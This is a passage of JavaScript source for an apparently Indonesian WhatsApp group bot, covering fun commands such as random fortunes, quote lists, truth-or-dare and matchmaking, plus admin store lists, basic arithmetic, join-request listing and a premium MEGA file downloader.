				];
				const randomKepribadian = kepribadian[Math.floor(Math.random() * kepribadian.length)];
				newReply(`🪄 *Cek Kepribadian*\n\nKamu memiliki kepribadian:\n${randomKepribadian}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekmasadepan': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const masaDepan = [
					'💼 Akan jadi bos besar di perusahaan ternama!',
					'🏝️ Pensiun muda dan tinggal di pulau tropis.',
					'💖 Akan menemukan cinta sejati dalam waktu dekat.',
					'📚 Akan jadi orang yang sangat berilmu dan dihormati.',
					'💸 Kaya raya dengan bisnis sukses!',
					'🎭 Masa depan Kamu penuh misteri dan kejutan!',
					'😴 Hmm... masa depan Kamu masih kabur, coba lagi nanti.'
				];
				const randomMasaDepan = masaDepan[Math.floor(Math.random() * masaDepan.length)];
				newReply(`🔮 *Cek Masa Depan*\n\nRamalan masa depan Kamu:\n${randomMasaDepan}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'quotesgalau': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const quotes = [
					'💔 "Kadang, diam adalah cara terbaik untuk menyampaikan betapa sakitnya hati ini."',
					'🥀 "Kamu tau yang lebih sakit dari patah hati? Berjuang sendirian untuk hubungan yang berdua."',
					'😔 "Aku baik-baik saja, cuma kadang capek pura-pura kuat."',
					'💬 "Kamu adalah alasan senyumku, tapi juga alasan air mataku."',
					'🌧️ "Hujan tahu bagaimana caranya menangis tanpa suara, sama sepertiku."',
					'💔 "Cinta yang terpendam lebih menyakitkan daripada cinta yang terungkap."',
					'🖤 "Kadang, kita harus melepaskan orang yang kita cinta untuk menemukan kebahagiaan."',
					'🌹 "Aku lebih suka diam, daripada menyakiti hati dengan kata-kata."',
					'😭 "Kamu pergi, tapi kenangan tetap bertahan."',
					'💧 "Air mata ini bukan karena kebodohan, tapi karena hati yang terlalu berharap."',
					'🥀 "Aku tahu kita sudah tidak sama lagi, tapi kenapa masih terasa seperti dulu?"',
					'💔 "Menyayangimu adalah bagian terbaik dalam hidupku, dan juga bagian terburuk."',
					'🌧️ "Aku menunggu hujan reda, tapi hatiku tetap basah."',
					'🌸 "Tidak ada yang lebih menyakitkan daripada merindukan seseorang yang sudah tidak peduli lagi."',
					'💭 "Aku terjebak dalam kenangan yang tak pernah bisa kembali."',
					'🌙 "Kadang aku bertanya-tanya, apakah Kamu merindukanku seperti aku merindukanmu?"',
					'💘 "Mencintaimu bukan keputusan, itu adalah takdir yang sulit untuk diterima."',
					'🖤 "Aku mencoba untuk melupakanmu, tapi semakin aku berusaha, semakin dalam luka ini."',
					'💔 "Cinta itu indah, tapi sering kali menyakitkan ketika harus berakhir."',
					'🌙 "Kepergianmu seperti bintang yang hilang di langit malam, tak pernah tergantikan."',
					'😢 "Sakit itu datang ketika kita menginginkan sesuatu yang tidak bisa kita miliki."',
					'💔 "Hidup ini penuh dengan keputusan, dan aku salah memilih untuk mencintaimu."',
					'🖤 "Aku belajar, bahwa terkadang mencintai itu lebih menyakitkan daripada melepaskan."',
					'🥀 "Kamu adalah luka yang tak pernah sembuh, tapi tetap ku pertahankan di hati."',
					'🌧️ "Hujan bukan hanya dari langit, tapi juga dari hatiku yang sedang merindu."',
					'💘 "Setiap kali aku mencoba melupakanmu, aku malah semakin terikat dengan kenangan kita."',
					'💔 "Aku tak tahu kapan cinta kita mulai pudar, tapi aku merasa kehilanganmu setiap hari."',
					'💭 "Apa yang bisa aku lakukan jika hatiku masih berharap pada sesuatu yang sudah tidak ada?"',
					'🌙 "Aku berusaha mengerti, tapi kadang hati ini tak mampu menerima kenyataan."',
					'💖 "Terkadang, kehilangan itu mengajarkan kita untuk lebih menghargai apa yang telah hilang."',
					'🌹 "Kamu pergi dan aku tetap di sini, terjebak dalam kenangan yang tak pernah bisa kembali."',
					'🖤 "Aku terus mencari jawaban, tapi semakin aku mencarinya, semakin aku bingung."',
					'💔 "Kenangan kita selalu muncul, meski aku mencoba untuk melupakan semuanya."',
					'🌧️ "Cinta itu seperti hujan, datang tanpa diundang, tapi meninggalkan luka setelahnya."',
					'💭 "Rasa ini mengalahkan segalanya, bahkan akal sehatku."',
					'🌙 "Aku bertanya-tanya, apakah Kamu pernah merasakan sakit yang sama seperti yang aku rasakan?"',
					'💘 "Ketika cinta berubah menjadi kenangan, yang bisa kita lakukan hanyalah menangis diam-diam."',
					'🖤 "Aku mencintaimu, tapi terkadang cinta itu harus disertai dengan keberanian untuk melepaskan."'
				];
				const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
				newReply(`💔 *Quotes Galau*\n\n${randomQuote}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'quotesislami': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const quotesIslami = [
					'🌙 "Sesungguhnya setelah kesulitan ada kemudahan, percayalah pada janji Allah."',
					'🕋 "Dan berdoalah kepada-Ku, niscaya akan Aku kabulkan untukmu." (QS. Ghafir:60)',
					'💫 "Hidup ini penuh ujian, namun Allah tidak akan memberikan ujian yang melebihi kemampuan hamba-Nya."',
					'🌹 "Ketika Kamu merasa lelah, ingatlah Allah selalu bersama orang-orang yang sabar."',
					'🌱 "Doa adalah senjata orang beriman, dan dengan doa, kita bisa mengubah takdir."',
					'🌙 "Jangan pernah merasa sendirian, karena Allah selalu mendengarkan setiap doa dan keluhanmu."',
					'✨ "Setiap ujian dalam hidup adalah cara Allah menunjukkan kasih sayang-Nya."',
					'💖 "Cinta Allah adalah cinta yang tak pernah mengecewakan. Bersandarlah pada-Nya."',
					'🕌 "Ingatlah, bahwa setiap langkah kita menuju Allah akan dimudahkan-Nya."',
					'🌟 "Bersyukurlah atas segala yang ada, karena setiap nikmat yang Allah berikan adalah anugerah."',
					'🕋 "Allah tidak akan mengubah keadaan suatu kaum, kecuali mereka mengubah apa yang ada pada diri mereka sendiri." (QS. Ar-Ra’d:11)',
					'💫 "Jangan pernah khawatir tentang masa depan, karena Allah sudah menyiapkan yang terbaik untukmu."',
					'🌹 "Kesabaran adalah kunci dari segala kemudahan, dan Allah pasti memberikan jalan keluar."',
					'🕊️ "Hidup di dunia hanya sementara, jadikan setiap langkah menuju akhirat penuh dengan kebaikan."',
					'🌱 "Tawakal kepada Allah setelah berusaha, karena Dia Maha Mengetahui apa yang terbaik untuk hamba-Nya."',
					'💖 "Sahabat terbaik dalam hidup ini adalah mereka yang mengingatkan kita pada Allah."',
					'🕋 "Jangan pernah putus asa, Allah selalu bersama orang-orang yang sabar." (QS. Al-Anfal:46)',
					'🌙 "Setiap doa yang dipanjatkan dengan tulus, pasti akan sampai pada-Nya, karena Allah Maha Mendengar."',
					'✨ "Keikhlasan dalam setiap amal akan mendekatkan kita pada cinta dan ridha Allah."',
					'🌟 "Jika Kamu merasa lemah, ingatlah bahwa Allah selalu ada untuk memberikan kekuatan."',
					'🕌 "Bersabarlah, karena Allah bersama orang-orang yang sabar." (QS. Al-Baqarah:153)',
					'💭 "Sesungguhnya Allah tidak membebani seseorang melainkan sesuai dengan kesanggupannya." (QS. Al-Baqarah:286)',
					'🌺 "Jangan menyerah, Allah selalu memberikan yang terbaik untuk hamba-Nya yang bersabar."',
					'💖 "Cinta yang sejati adalah cinta yang mengingatkan kita pada Allah dan Rasul-Nya."',
					'✨ "Tunggu jawaban terbaik dari Allah, karena Dia selalu memberi yang terbaik pada waktu yang tepat."',
					'🌙 "Beriman dan bertawakal pada Allah adalah cara terbaik untuk meraih ketenangan hati."'
				];
				const randomQuote = quotesIslami[Math.floor(Math.random() * quotesIslami.length)];
				newReply(`🌙 *Quotes Islami*\n\n${randomQuote}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'quotespsikologi': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const quotesPsikologi = [
					'🧠 "Kekuatan terbesar yang dimiliki manusia adalah kemampuan untuk mengendalikan pikirannya." - Buddha',
					'🌱 "Pikiran kita membentuk dunia kita. Jika kita ingin perubahan dalam hidup, kita harus mulai dengan pikiran."',
					'💭 "Jangan biarkan masa lalu mengendalikan masa depanmu. Kamu memiliki kekuatan untuk mengubahnya sekarang."',
					'💡 "Perubahan dimulai dari dalam diri kita, dan itu terjadi ketika kita memilih untuk melihat dunia dengan cara yang berbeda."',
					'✨ "Bukan berapa kali Kamu jatuh yang menentukan, tapi berapa kali Kamu bangkit setelahnya."',
					'🌸 "Kebahagiaan tidak datang dari luar, tetapi dari cara kita merespon apa yang terjadi di dalam diri kita."',
					'🧘 "Kesehatan mental itu penting, dan menjaga pikiran sama pentingnya dengan menjaga tubuh."',
					'🔑 "Ketika Kamu berhenti menginginkan yang tidak bisa Kamu kontrol, Kamu akan menemukan kedamaian."',
					'🌻 "Cobalah untuk tidak terlalu keras pada dirimu sendiri, Kamu sudah berusaha dengan baik."',
					'🎯 "Kehidupan ini penuh dengan ketidakpastian, dan cara kita meresponnya adalah kunci untuk kebahagiaan."',
					'💬 "Kesulitan yang Kamu hadapi sekarang adalah jembatan menuju kekuatan yang lebih besar."',
					'🌙 "Jika Kamu merasa terjebak, ingatlah bahwa Kamu memiliki kemampuan untuk berubah kapan saja."',
					'🧠 "Kendalikan pikiranmu, dan Kamu akan mengendalikan hidupmu."',
					'🌱 "Sukses sejati bukanlah pencapaian materi, tapi kedamaian dalam hati dan pikiran."',
					'💭 "Self-compassion adalah kunci untuk membebaskan diri dari tekanan dan rasa bersalah."',
					'🌟 "Pikiran positif bukan hanya tentang melihat hal baik, tetapi tentang memahami bahwa setiap tantangan adalah kesempatan."',
					'💡 "Perjalanan untuk memahami diri sendiri adalah perjalanan terindah yang akan membawa ketenangan batin."',
					'🌸 "Belajarlah untuk menerima dirimu apa adanya, karena hanya dengan itu Kamu bisa berkembang."',
					'✨ "Keberanian bukanlah tanpa rasa takut, tapi kemampuan untuk terus maju meskipun takut."',
					'🌻 "Cinta pada diri sendiri adalah langkah pertama untuk bisa mencintai orang lain dengan tulus."',
					'💭 "Ketika kita berhenti mengejar kebahagiaan, kita justru mulai menemukannya dalam hidup sehari-hari."',
					'🧘 "Penerimaan diri adalah dasar dari kesehatan mental yang baik."',
					'🎯 "Perubahan dimulai dengan keputusan untuk melihat segala sesuatu dengan cara yang lebih positif."',
					'💡 "Kesalahan adalah bagian dari proses belajar, dan setiap langkah kecil membawa kita lebih dekat pada tujuan."',
					'🌙 "Jangan biarkan ketakutan menghalangi potensimu. Ketakutan hanya akan mengecilkan langkahmu."',
					'🧠 "Tidak ada yang salah dengan merasa tidak baik-baik saja. Yang penting adalah bagaimana Kamu bangkit dari situasi tersebut."'
				];
				const randomQuote = quotesPsikologi[Math.floor(Math.random() * quotesPsikologi.length)];
				newReply(`💭 *Quotes Psikologi*\n\n${randomQuote}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'bisa': {
				if (!text) return newReply(`Tanyakan sesuatu dong~\n\nContoh: ${prefix + command} aku belajar coding?`)
				let jawaban = [`Bisa banget!`, `Hmm, kayaknya enggak bisa deh.`, `Nggak mungkin, maaf ya.`, `Tentu saja Kamu bisa!!! Ayo semangat!`]
				let hasil = jawaban[Math.floor(Math.random() * jawaban.length)]
				let respon = `*Bisa ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'apakah': {
				if (!text) return newReply(`Yuk tanyakan sesuatu!\n\nContoh: ${prefix + command} dia jodohku?`)
				let jawaban = [`Iya`, `Tidak`, `Mungkin aja sih`, `Bener banget tuh!`]
				let hasil = jawaban[Math.floor(Math.random() * jawaban.length)]
				let respon = `*Apakah ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'kapan': {
				if (!text) return newReply(`Hmm, kapan ya? Yuk tanya detail!\n\nContoh: ${prefix + command} aku jadi sukses?`)
				let waktu = ['5 hari lagi', '10 hari lagi', '15 hari lagi', '1 bulan lagi', '3 bulan lagi', '1 tahun lagi', 'Besok!', 'Lusa!', 'Nggak lama lagi kok!']
				let hasil = waktu[Math.floor(Math.random() * waktu.length)]
				let respon = `*Kapan ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'apa': {
				if (!text) return newReply(`Coba tanyain dong, aku penasaran juga!\n\nContoh: ${prefix + command} makanan favoritmu?`)
				let jawaban = [`Tanya pacarmu deh!`, `Aku nggak tahu, serius.`, `Hmm, coba cari tahu sendiri ya!`]
				let hasil = jawaban[Math.floor(Math.random() * jawaban.length)]
				let respon = `*Apa ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'dimana': {
				if (!text) return newReply(`Lokasinya di mana ya? Coba tanyain aku!\n\nContoh: ${prefix + command} letak rumahku?`)
				let lokasi = [`Di gunung`, `Di Mars`, `Di hatimu~`, `Di hutan belantara`, `Coba tanya mamamu.`, `Rahasia dong!`]
				let hasil = lokasi[Math.floor(Math.random() * lokasi.length)]
				let respon = `*Di mana ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'bagaimana': {
				if (!text) return newReply(`Ceritain dong, biar aku bisa bantu!\n\nContoh: ${prefix + command} cara bikin bot?`)
				let jawaban = [`Hmm, coba cari di Google ya.`, `Kayaknya susah deh.`, `Ayo semangat! Kamu pasti bisa kok.`, `Maaf, aku nggak tahu jawabannya.`, `Wah, seriusan nanya itu? 🤔`]
				let hasil = jawaban[Math.floor(Math.random() * jawaban.length)]
				let respon = `*Bagaimana ${text}*\nJawabanku: ${hasil}`
				await newReply(respon)
			}
			break

			case 'nilai': {
				if (!text) return newReply(`Aku kasih nilai nih, tanya aja!\n\nContoh: ${prefix + command} tampangku?`)
				let angka = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
				let hasil = angka[Math.floor(Math.random() * angka.length)]
				let respon = `*Nilai untuk ${text}*\nJawabanku: ${hasil}%`
				await newReply(respon)
			}
			break

			case 'jodohku': {
				if (!m.isGroup) return newReply(`Fitur ini cuma bisa dipakai di grup, ya!`)
				let anggota = participants.map(u => u.id)
				let pengirim = m.sender
				let jodoh = anggota[Math.floor(Math.random() * anggota.length)]

				sock.sendMessage(m.chat, { 
					text: `👫 Jodohmu adalah...\n@${pengirim.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\nWah, cocok banget nih!`, 
					contextInfo: {
						mentionedJid: [pengirim, jodoh],
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							mediaType: 1,
							previewType: 1,
							body: ownerName,
							thumbnailUrl: imageUrl,
							renderLargerThumbnail: false,
							mediaUrl: wagc,
							sourceUrl: wagc
						}
					}
				})
			}
			break

			case 'pasangan': {
				if (!m.isGroup) return newReply(`Fitur ini cuma bisa dipakai di grup ya, sabar!`)
				let anggota = participants.map(u => u.id)
				let pertama = anggota[Math.floor(Math.random() * anggota.length)]
				let second = anggota[Math.floor(Math.random() * anggota.length)]
				sock.sendMessage(m.chat, { 
					text: `@${pertama.split('@')[0]} ❤️ @${second.split('@')[0]}\nWah, ada apa nih? Cocok banget nih! 💖`, 
					contextInfo: {
						mentionedJid: [pertama, second],
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							mediaType: 1,
							previewType: 1,
							body: ownerName,
							thumbnailUrl: imageUrl,
							renderLargerThumbnail: false,
							mediaUrl: wagc,
							sourceUrl: wagc
						}
					}
				})
			};
			break

			case 'truth': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const truths = [
					'😈 Apa rahasia terbesar yang belum pernah Kamu ceritakan ke siapa pun?',
					'🤭 Siapa orang yang diam-diam Kamu suka saat ini?',
					'🫣 Pernah bohong sama sahabat sendiri? Tentang apa?',
					'👀 Hal paling memalukan yang pernah Kamu alami?',
					'💬 Kalau bisa kembali ke masa lalu, apa yang ingin Kamu ubah?',
					'👀 Apa yang selalu Kamu sembunyikan dari teman-temanmu?',
					'😶 Apa yang paling Kamu takuti dalam hidup ini?',
					'🤔 Hal apa yang Kamu sesali tapi tidak bisa diperbaiki?',
					'🤐 Pernah melakukan sesuatu yang Kamu tidak ingin orang lain tahu?',
					'😱 Kalau Kamu bisa tahu satu rahasia besar dari seseorang, siapa yang Kamu pilih?',
					'💭 Apa yang membuatmu merasa sangat cemas atau takut?',
					'🙈 Apa hal terburuk yang pernah Kamu lakukan di masa remaja?',
					'👁️ Apa hal yang paling Kamu banggakan tentang dirimu sendiri?',
					'📚 Ada gak keputusan besar dalam hidupmu yang Kamu sesali?',
					'🧐 Apa yang akan Kamu lakukan jika tahu Kamu hanya punya 1 hari lagi hidup?',
					'🤐 Ada gak hal yang Kamu sembunyikan dari orang yang sangat dekat denganmu?',
					'💔 Apa yang pernah membuatmu patah hati?',
					'🌑 Apa hal yang Kamu sangat takuti tetapi tidak ingin orang lain tahu?',
					'🔒 Apa yang Kamu sembunyikan dari keluarga Kamu?',
					'💭 Apakah ada keputusan besar yang Kamu ambil dengan menyesal?',
					'🛑 Apa kebiasaan buruk yang sulit Kamu tinggalkan?',
					'🤯 Apakah ada sesuatu yang Kamu ingin katakan pada seseorang, tetapi Kamu selalu takut untuk mengatakannya?',
					'🙈 Apa yang selalu membuatmu merasa cemas sebelum tidur?',
					'🎭 Siapa yang paling Kamu khawatirkan akan melukai perasaanmu?',
					'🎥 Apa film yang paling menggambarkan hidupmu sejauh ini?',
					'📜 Apa tujuan hidupmu yang paling penting menurutmu?'
				];
				const randomTruth = truths[Math.floor(Math.random() * truths.length)];
				newReply(`🤔 *Truth*\n\n${randomTruth}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'dare': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const dares = [
					'🔥 Kirim chat "Aku suka Kamu" ke kontak terakhir yang Kamu chat!',
					'😜 Kirim voice note bilang "Aku adalah manusia paling lucu sedunia."',
					'🤡 Foto selfie dengan ekspresi wajah paling aneh dan kirim ke grup!',
					'🕺 Kirim video Kamu joget lagu favorit selama 10 detik.',
					'📸 Post story IG dengan caption "Aku lagi kena dare nih, tolong selamatkan!"',
					'🎤 Nyanyikan lagu favoritmu dan kirimkan ke teman!',
					'🤳 Ambil foto dengan ekspresi paling serius dan kirimkan ke grup!',
					'🎮 Mainkan game di ponselmu selama 5 menit dan kirimkan tangkapan layar score tertinggi!',
					'📱 Kirim pesan ke mantanmu yang isinya hanya "Hai!"',
					'💃 Cobalah joget gaya bebas selama 20 detik dan kirim video ke grup!',
					'📸 Foto makananmu dan kirim ke teman dengan caption "Ini yang aku makan hari ini, lapar banget!"',
					'🖋️ Tulis pesan di papan tulis atau kertas dengan tulisan besar "Aku lagi kena dare!" dan kirim fotonya!',
					'🌍 Video diri Kamu jalan mundur selama 15 detik dan kirim ke grup!',
					'📱 Ganti foto profilmu dengan gambar lucu selama 1 jam!',
					'🥳 Berpura-puralah menjadi karakter kartun selama 1 menit dan kirimkan video ke grup!',
					'🥴 Coba lakukan mimik wajah yang paling kocak dan kirim ke teman-temanmu!',
					'🎧 Dengarkan lagu yang sangat Kamu benci selama 5 menit dan ceritakan perasaanmu setelah itu!',
					'🎬 Rekam video diri Kamu berbicara tentang topik acak selama 1 menit dan kirim ke grup!',
					'🎤 Cobalah untuk menyanyi lagu yang Kamu tidak kuasai selama 30 detik!',
					'🖼️ Gambar wajahmu di atas kertas dengan tangan kiri, lalu kirim fotonya!',
					'🕶️ Ambil foto dengan pakaian paling konyol yang Kamu punya dan kirim ke grup!',
					'📲 Kirimkan emoji yang paling mencerminkan dirimu ke grup!',
					'🎨 Buat gambar dengan benda-benda yang ada di sekitar Kamu, kirim foto hasilnya!',
					'🤩 Berpura-pura menjadi selebritas selama 2 menit dan rekam video!',
					'🎁 Beli sesuatu yang tidak pernah Kamu butuhkan dan tunjukkan pada teman-teman!',
					'🤳 Video dirimu melakukan tantangan dengan tangan di atas kepala selama 1 menit!',
					'🍕 Ambil foto makanan cepat saji dan caption "Makan malam ala anak gaul!"',
					'🎵 Kirim lagu yang membuatmu teringat seseorang ke grup!',
					'🔄 Ubah status WhatsApp dengan kata-kata yang sangat random selama 2 jam!'
				];
				const randomDare = dares[Math.floor(Math.random() * dares.length)];
				newReply(`😈 *Dare*\n\n${randomDare}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'list':
			case 'store': {
				try {
					const keys = Object.keys(db.data.chats[m.chat].liststore);
					if (keys.length === 0) return newReply(`Yah, sepertinya belum ada list yang tersedia di grup ini. 😔`);
					let teks = `Halo @${m.sender.split("@")[0]}! 🎉 Ini dia beberapa list yang bisa Kamu cek sekarang. Yuk, pilih yang Kamu suka! 🛍️\n\n`;
					const result = [];
					const list = [];
					keys.forEach(key => {
						result.push({
							key: key
						});
						list.push({
							header: capitalizeWords(key) + " 🛒",
							title: "Klik untuk melihat produk",
							id: key
						});
					});
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Store List 🛍️",
							"sections": [{
								"title": "Eksplorasi Semua Store Official 🔥",
								"highlight_label": "New",
								"rows": ${JSON.stringify(list)}
							}]
						}`
					}];
					sock.sendButtonText(m.chat, button, teks, footer, m)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'dellist': {
				if (!m.isGroup) return newReply(`Oops, Kamu hanya bisa menghapus list di dalam grup ya! 😅`);
				if (!isAdmins && !isCreator) return newReply(`Hanya admin atau creator yang bisa menghapus list, sorry ya! 😜`);
				try {
					const keys = Object.keys(db.data.chats[m.chat].liststore);
					if (keys.length === 0) return newReply(`Belum ada list message yang tersimpan di grup ini. 😔`);
					if (!text) return newReply(`Gunakan format yang benar ya! Misalnya: ${prefix + command} *key*\n*Kirim perintah*: ${prefix + command} hello`);
					if (!db.data.chats[m.chat].liststore[text]) return newReply(`Key *${text}* belum terdaftar di grup ini. Cek lagi ya!`);
					delete db.data.chats[m.chat].liststore[text];
					newReply(`List message dengan key *${text}* berhasil dihapus. Bye-bye! 👋`);
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'addlist': {
				if (!m.isGroup) return newReply(`Kamu hanya bisa menambahkan list di grup ya! 🫣`);
				if (!isAdmins && !isCreator) return newReply(`Hanya admin atau creator yang bisa menambah list. 😇`);
				let args1 = q.split("|")[0].toLowerCase();
				let args2 = q.split("|")[1];
				if (!q.includes("|")) return newReply(`Gunakan format yang benar!*Kirim perintah*: ${prefix + command} *key|product*\n*Kirim perintah*: ${prefix + command} hello|hi`);
				if (db.data.chats[m.chat].liststore[args1]) return newReply(`List dengan key *${args1}* sudah ada di grup ini. 😬`);
				try {
					if (/image/.test(mime)) {
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						const url = await CatBox(media);
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: url,
							video: ""
						};
						newReply(`List message dengan key *${args1}* berhasil ditambahkan. Enjoy! 😎`);
					} else if (/video/.test(mime)) {
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						const url = await CatBox(media);
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: url
						};
						newReply(`List message dengan key *${args1}* berhasil ditambahkan. Let's go! 🎥`);
					} else {
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: ""
						};
						newReply(`List message dengan key *${args1}* berhasil ditambahkan. 😄`);
					}
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'updatelist':
			case 'update': {
				if (!m.isGroup) return newReply(`Cuma bisa update list di grup ya! 🫢`);
				if (!isAdmins && !isCreator) return newReply(`Cuma admin atau creator yang bisa update list. 😇`);
				let args1 = q.split("|")[0].toLowerCase();
				let args2 = q.split("|")[1];
				if (!q.includes("|")) return newReply(`Gunakan format yang benar!*Kirim perintah*: ${prefix + command} *key|product*\n*Kirim perintah*: ${prefix + command} hello|hi`);
				if (!db.data.chats[m.chat].liststore[args1]) return newReply(`Key *${args1}* belum terdaftar di grup ini, gak bisa diupdate dong! 😥`);
				try {
					if (/image/.test(mime)) {
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						const url = await CatBox(media);
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: url,
							video: ""
						};
						newReply(`List message dengan key *${args1}* berhasil diupdate. 😎`);
					} else if (/video/.test(mime)) {
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						const url = await CatBox(media);
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							 response: args2,
							img: "",
							video: url
						};
						newReply(`List message dengan key *${args1}* berhasil diupdate. 🎬`);
					} else {
						db.data.chats[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: ""
						};
						newReply(`List message dengan key *${args1}* berhasil diupdate. 🤩`);
					}
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'tambah': {
				if (!text.includes('+')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
				try {
					arg = args.join(' ')
					atas = arg.split('+')[0]
					bawah = arg.split('+')[1]
					let nilai_one = Number(atas)
					let nilai_two = Number(bawah)
					newReply(`${nilai_one + nilai_two}`)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'kurang': {
				if (!text.includes('-')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* · *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
				try {
					arg = args.join(' ')
					atas = arg.split('-')[0]
					bawah = arg.split('-')[1]
					let nilai_one = Number(atas)
					let nilai_two = Number(bawah)
					newReply(`${nilai_one - nilai_two}`)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'kali': {
				if (!text.includes('*')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
				try {
					arg = args.join(' ')
					atas = arg.split('*')[0]
					bawah = arg.split('*')[1]
					let nilai_one = Number(atas)
					let nilai_two = Number(bawah)
					newReply(`${nilai_one * nilai_two}`)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'bagi': {
				if (!text.includes('/')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
				try {
					arg = args.join(' ')
					atas = arg.split('/')[0]
					bawah = arg.split('/')[1]
					let nilai_one = Number(atas)
					let nilai_two = Number(bawah)
					newReply(`${nilai_one / nilai_two}`)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'getjoinrequest':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				const data = await sock.groupRequestParticipantsList(m.chat);
				if (!data || !data.length) {
					sock.sendMessage(m.chat, {text: '✨ Tidak ada permintaan bergabung yang tertunda. ✅'}, {quoted:m});
					return;
				}
				let replyMessage = `📋 *Daftar Permintaan Bergabung*: \n\n`;
				data.forEach((request, index) => {
					const { jid, request_method, request_time } = request;
					const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
					replyMessage += `*No. ${index + 1} - Detail Permintaan Bergabung:*\n`;
					replyMessage += `🧑‍🤝‍🧑 *ID Pengguna*: ${jid}\n`;
					replyMessage += `🔧 *Metode*: ${request_method}\n`;
					replyMessage += `🕰️ *Waktu Permintaan*: ${formattedTime}\n\n`;
				});
				sock.sendMessage(m.chat, {
					text: replyMessage
				}, { 
					quoted: m 
				});
			};
			break;

			case 'mega':{
				try {
					if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
					if (!isPremium) return newReply(mess.premium);
					if (!text) return newReply(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
					const { File } = require('megajs');
					const file = File.fromURL(text);
					await file.loadAttributes();
					if (file.size >= 300000000) return newReply('😔 *File terlalu besar* (Ukuran maksimal: 300MB). Silakan coba file lain ya!');
					const downloadingMessage = `🌩️ *Sedang mendownload file...* Mohon tunggu sebentar ya!`;
					newReply(downloadingMessage);
					const caption = `✨ *Berhasil didownload!* ✨\nFile: ${file.name}\nUkuran: ${formatBytes(file.size)}`;
					const data = await file.downloadBuffer();
					const fileExtension = path.extname(file.name).toLowerCase();
					const mimeTypes = {
						".mp4": "video/mp4",
						".pdf": "application/pdf",
						".zip": "application/zip",
						".rar": "application/x-rar-compressed",
						".7z": "application/x-7z-compressed",
						".jpg": "image/jpeg",
						".jpeg": "image/jpeg",
						".png": "image/png",
					};
					let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
					await sock.sendMessage(m.chat, {
						document: data, 
						mimetype: mimetype, 
						fileName: file.name, 
						caption: caption
					}, { quoted: m });
				} catch (error) {
					return newReply(`⚠️ *Oops, terjadi kesalahan*: ${error.message}`);
				}
				db.data.users[m.sender].limit -= 1;
				break;
